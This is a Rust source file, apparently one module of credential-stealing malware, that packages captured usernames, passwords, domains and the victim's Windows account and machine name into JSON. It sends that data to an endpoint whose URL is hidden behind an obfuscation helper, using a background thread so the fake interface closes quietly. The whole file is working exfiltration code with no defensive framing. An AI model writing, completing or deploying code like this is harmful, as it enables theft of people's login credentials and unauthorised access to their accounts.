//! Exfiltration module for sending captured credentials to the remote HTTP endpoint.

use serde::Serialize;
use std::thread;
use crate::obfuscate::get_endpoint_url;

#[derive(Debug, Serialize)]
pub struct CredentialPayload {
    pub username: String,
    pub password: String,
    pub domain: String,
    pub system_user: String,
    pub hostname: String,
    pub timestamp: String,
}

impl CredentialPayload {
    pub fn new(username: String, password: String, domain: &str) -> Self {
        let system_user = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into());
        let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
        let timestamp = format!("{:?}", std::time::SystemTime::now());

        Self {
            username,
            password,
            domain: domain.to_string(),
            system_user,
            hostname,
            timestamp,
        }
    }
}

/// Dispatches credentials asynchronously to the remote endpoint.
pub fn exfiltrate_credentials(username: String, password: String, domain: &str) {
    let payload = CredentialPayload::new(username, password, domain);
    let endpoint = get_endpoint_url();

    // Spawn a worker thread with timeout so UI exits gracefully without hanging
    thread::spawn(move || {
        let _ = ureq::post(&endpoint)
            .header("Content-Type", "application/json")
            .send_json(&payload);
    });
}
